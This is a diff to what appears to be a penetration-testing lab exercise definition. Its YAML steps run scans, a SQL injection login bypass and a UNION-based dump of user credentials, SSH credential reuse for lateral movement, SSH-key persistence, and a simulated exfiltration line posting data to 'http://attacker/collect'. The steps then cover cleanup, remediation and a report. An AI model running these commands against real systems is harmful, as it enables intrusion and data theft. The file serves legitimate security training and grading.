@@ -23,6 +23,7 @@ steps:
     type: output_contains
     expect: Nmap scan report
     field: stdout
+  target_vm: attacker
   script: sudo nmap -sn 10.20.30.0/24 && echo '===== Service Detection =====' && sudo nmap -sV -T4 -p- --top-ports 100 10.20.30.1 10.20.30.80 10.20.30.100
   risk_level: low
 - order: 2
@@ -37,6 +38,7 @@ steps:
     type: output_contains
     expect: Web Recon
     field: stdout
+  target_vm: attacker
   script: 'echo ''=== Web Recon ==='' && curl -sI http://10.20.30.80:3000 | head -10 && echo ''--- robots.txt ---'' && curl -s http://10.20.30.80:3000/robots.txt && echo ''--- /ftp ---'' && curl -s http://10.20.30.80:3000/ftp
     | head -10 && echo ''--- API ---'' && curl -s http://10.20.30.80:3000/api/Products | python3 -c ''import sys,json; print(f"Products: {len(json.load(sys.stdin)["data"])}")'' 2>/dev/null'
   risk_level: low
@@ -51,6 +53,7 @@ steps:
     type: output_contains
     expect: Scan
     field: stdout
+  target_vm: attacker
   script: echo '=== Nikto Scan ===' && nikto -h http://10.20.30.80:3000 -maxtime 60 2>/dev/null | tail -20 && echo '=== NSE Vuln Scan ===' && nmap --script vuln -p 3000 10.20.30.80 2>/dev/null | head -30
   risk_level: low
 - order: 4
@@ -65,6 +68,7 @@ steps:
     type: output_contains
     expect: Admin token acquired
     field: stdout
+  target_vm: attacker
   script: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
     && echo "Admin token acquired: ${TOKEN:0:50}..." && python3 -c "import base64,json; p=''$TOKEN''.split(''.'')[1]; p+=''=''*(-len(p)%4); d=json.loads(base64.urlsafe_b64decode(p)); print(f''User: {d.get(\"data\",{}).get(\"email\",\"unknown\")}'')"'
   risk_level: medium
@@ -80,6 +84,7 @@ steps:
     type: output_contains
     expect: '@'
     field: stdout
+  target_vm: attacker
   script: 'curl -s ''http://10.20.30.80:3000/rest/products/search?q=test%27%29%20UNION%20SELECT%20email,password,3,4,5,6,7,8,9%20FROM%20Users--'' 2>/dev/null | python3 -c "import sys,json; d=json.load(sys.stdin);
     [print(f\"{p.get(''name'','''')}: {p.get(''description'','''')}\") for p in d.get(''data'',[])]" 2>/dev/null | head -10'
   risk_level: medium
@@ -95,6 +100,7 @@ steps:
     type: output_contains
     expect: Lateral movement
     field: stdout
+  target_vm: attacker
   script: 'sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 ''sshpass -p1 ssh -o StrictHostKeyChecking=no secu@10.20.30.1 "hostname && id" 2>/dev/null'' 2>/dev/null && echo ''=== Lateral movement:
     web -> secu SUCCESS ==='''
   risk_level: medium
@@ -110,6 +116,7 @@ steps:
     type: output_contains
     expect: sudo
     field: stdout
+  target_vm: attacker
   script: sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 'echo "=== sudo ==="; echo 1 | sudo -S -l 2>/dev/null | tail -5; echo "=== SUID ==="; find / -perm -4000 -type f 2>/dev/null | head
     -10; echo "=== Capabilities ==="; getcap -r / 2>/dev/null; echo "=== Writable cron ==="; ls -la /etc/cron.d/ 2>/dev/null' 2>/dev/null
   risk_level: low
@@ -125,6 +132,7 @@ steps:
     type: output_contains
     expect: Persistence established
     field: stdout
+  target_vm: attacker
   script: 'ssh-keygen -t ed25519 -f /tmp/pentest_key -N '''' -q 2>/dev/null && cat /tmp/pentest_key.pub | sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 ''mkdir -p ~/.ssh; cat >> ~/.ssh/authorized_keys''
     2>/dev/null && ssh -i /tmp/pentest_key -o StrictHostKeyChecking=no web@10.20.30.80 ''echo "Persistence established: $(whoami)@$(hostname)"'' 2>/dev/null'
   risk_level: medium
@@ -141,6 +149,7 @@ steps:
     type: output_contains
     expect: Exfiltration simulation
     field: stdout
+  target_vm: attacker
   script: 'curl -s http://10.20.30.80:3000/api/Users | python3 -c "import sys,json; [print(u[''email'']) for u in json.load(sys.stdin)[''data'']]" > /tmp/pentest_exfil.txt 2>/dev/null && openssl enc -aes-256-cbc
     -salt -in /tmp/pentest_exfil.txt -out /tmp/pentest_exfil.enc -pass pass:pentest2026 -pbkdf2 2>/dev/null && echo ''Exfiltration simulation:'' && echo "Data size: $(wc -c < /tmp/pentest_exfil.txt) bytes
     -> $(wc -c < /tmp/pentest_exfil.enc) bytes (encrypted)" && echo ''Transfer command: curl -X POST -F file=@/tmp/pentest_exfil.enc http://attacker/collect'''
@@ -157,6 +166,7 @@ steps:
     type: output_contains
     expect: ===
     field: stdout
+  target_vm: attacker
   script: echo '=== Suricata Alerts ===' && sshpass -p1 ssh -o StrictHostKeyChecking=no secu@10.20.30.1 'tail -10 /var/log/suricata/fast.log 2>/dev/null' 2>/dev/null && echo '=== Wazuh Alerts ===' && sshpass
     -p1 ssh -o StrictHostKeyChecking=no siem@10.20.30.100 'tail -10 /var/ossec/logs/alerts/alerts.log 2>/dev/null' 2>/dev/null
   risk_level: low
@@ -174,6 +184,7 @@ steps:
     type: output_contains
     expect: Vulnerability Classification
     field: stdout
+  target_vm: attacker
   script: 'echo -e ''=== Vulnerability Classification ===\n\n| # | Vulnerability | CVSS | Severity | OWASP |\n|---|-------------|------|----------|-------|\n| 1 | SQL Injection (login bypass) | 9.8 | Critical
     | A03 |\n| 2 | UNION SQLi (data extraction) | 9.1 | Critical | A03 |\n| 3 | User data API exposure | 7.5 | High | A01 |\n| 4 | Credential reuse (SSH) | 8.1 | High | A07 |\n| 5 | Missing rate limiting
     | 7.3 | High | A07 |\n| 6 | XSS (Reflected) | 6.1 | Medium | A03 |\n| 7 | Directory listing (/ftp) | 5.3 | Medium | A05 |\n| 8 | Missing security headers | 5.0 | Medium | A05 |\n| 9 | Version info disclosure
@@ -194,6 +205,7 @@ steps:
     type: output_contains
     expect: Attack Path Diagram
     field: stdout
+  target_vm: attacker
   script: 'echo -e ''=== Attack Path Diagram ===\n\n[Attacker: attacker 10.20.30.201]\n        |\n        | (1) Recon: nmap scan\n        v\n[Web Server: 10.20.30.80]\n   |    |    |\n   |    |    +-- (2)
     SQLi login bypass -> Admin JWT\n   |    |    +-- (3) UNION SQLi -> User DB dump\n   |    |    +-- (4) XSS -> Session hijack\n   |    |\n   |    +-- (5) SSH cred reuse (password: 1)\n   |              |\n   |              v\n   |    [Secu:
     10.20.30.1]\n   |         +-- (6) Firewall rules access\n   |         +-- (7) Suricata config access\n   |\n   +-- (5) SSH cred reuse\n              |\n              v\n   [SIEM: 10.20.30.100]\n        +--
@@ -212,6 +224,7 @@ steps:
     type: output_contains
     expect: Cleanup complete
     field: stdout
+  target_vm: attacker
   script: echo '=== Cleanup ===' && rm -f /tmp/pentest_key /tmp/pentest_key.pub /tmp/pentest_exfil.txt /tmp/pentest_exfil.enc && echo 'Local artifacts removed' && sshpass -p1 ssh -o StrictHostKeyChecking=no
     web@10.20.30.80 'sed -i "/pentest/d" ~/.ssh/authorized_keys 2>/dev/null; rm -rf /tmp/.hidden_backdoor 2>/dev/null' 2>/dev/null && echo 'Remote backdoors cleaned' && echo 'Cleanup complete'
   risk_level: low
@@ -228,6 +241,7 @@ steps:
     type: output_contains
     expect: Remediation Recommendations
     field: stdout
+  target_vm: attacker
   script: echo -e '=== Remediation Recommendations ===\n\n[CRITICAL - 즉시 조치 (1주 이내)]\n1. SQL Injection 수정\n   - Parameterized queries/Prepared statements 적용\n   - ORM 사용 (Sequelize, SQLAlchemy)\n   - WAF
     rule 추가\n\n2. User API 접근 제어\n   - /api/Users 인증 필수화\n   - 민감 필드(password) 응답에서 제외\n\n[HIGH - 단기 조치 (1개월 이내)]\n3. SSH 비밀번호 정책\n   - 서버별 고유 비밀번호\n   - SSH 키 기반 인증으로 전환\n   - 비밀번호 인증 비활성화\n\n4. Rate Limiting\n   -
     로그인 API에 rate limit 적용 (5회/분)\n   - 계정 잠금 (10회 실패 후 30분)\n\n[MEDIUM - 중기 조치 (3개월 이내)]\n5. 보안 헤더 추가\n6. 에러 메시지 최소화\n7. 디렉토리 리스팅 비활성화\n8. 정기 취약점 스캔 자동화'
@@ -248,6 +262,7 @@ steps:
     type: output_contains
     expect: PENETRATION TEST REPORT
     field: stdout
+  target_vm: attacker
   script: 'echo -e ''=== PENETRATION TEST REPORT ===\n=== Executive Summary ===\n\nDate: 2026-04-03\nScope: 10.20.30.0/24 (4 servers)\nTesters: Security Lab Student\nClassification: Confidential\n\n[Overall
     Risk: HIGH]\n\nThe penetration test identified 10 vulnerabilities across\nthe target infrastructure. 2 Critical and 3 High severity\nvulnerabilities were discovered, allowing:\n\n1. Complete database
     compromise via SQL Injection\n2. Full lateral movement across all servers\n3. Persistent unauthorized access\n4. Potential data exfiltration\n\n[Statistics]\n- Critical: 2 (SQL Injection, Data Exposure)\n-
